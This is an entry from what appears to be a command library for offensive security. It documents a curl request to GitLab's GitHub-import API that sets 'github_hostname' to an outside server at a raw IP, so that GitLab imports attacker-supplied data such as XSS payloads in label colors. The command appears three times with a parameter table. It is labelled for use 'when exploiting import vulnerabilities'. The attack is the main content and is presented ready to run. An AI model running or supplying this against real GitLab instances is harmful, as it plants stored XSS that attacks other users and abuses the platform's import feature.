---
data: >-
  curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header
  "content-type: application/json" --header "PRIVATE-TOKEN: $GL_TOKEN" --data '{
   "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
   "repo_id": "523303538",
   "target_namespace": "yvvdwf-group-a",
   "new_name": "xss-on-label-color",
   "github_hostname": "http://51.75.74.52:11211"
  }'
tags:
  - api
  - import
  - gitlab
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.959Z'
id: 1009894f-1c57-448a-953e-bf6be439b970
verified: false
validated: true
submitted: true
---
# gitlab-github-import-curl

## Command

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: $GL_TOKEN" --data '{
 "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
 "repo_id": "523303538",
 "target_namespace": "yvvdwf-group-a",
 "new_name": "xss-on-label-color",
 "github_hostname": "http://51.75.74.52:11211"
}'
```

## Description

This command imports a GitHub repository into GitLab using the API, allowing specification of a custom hostname to pull malicious data like XSS payloads in labels. Use when exploiting import vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-kv` | Verbose output (-v) and insecure SSL (-k) | Yes |
| `--request POST` | HTTP method | Yes |
| `--header "content-type: application/json"` | Sets JSON payload type | Yes |
| `--header "PRIVATE-TOKEN: $GL_TOKEN"` | GitLab auth token | Yes |
| `--data` | JSON with import details: personal_access_token (GitHub token), repo_id, target_namespace, new_name, github_hostname | Yes |

## Examples

### Basic Usage

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: $GL_TOKEN" --data '{ "personal_access_token": "ghp_...", "repo_id": "123", "target_namespace": "group", "new_name": "repo" }'
```

### Advanced Usage

Include custom hostname for dummy server:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: $GL_TOKEN" --data '{ "personal_access_token": "ghp_...", "repo_id": "523303538", "target_namespace": "yvvdwf-group-a", "new_name": "xss-on-label-color", "github_hostname": "http://51.75.74.52:11211" }'
```

## Expected Output

JSON response like {"id":456,"status":"started","import_url":"/api/v4/projects/123/import"} on success; errors if token invalid or server unreachable.

## Related

- [[Related Procedure: Import-Malicious-Repository-via-API]]
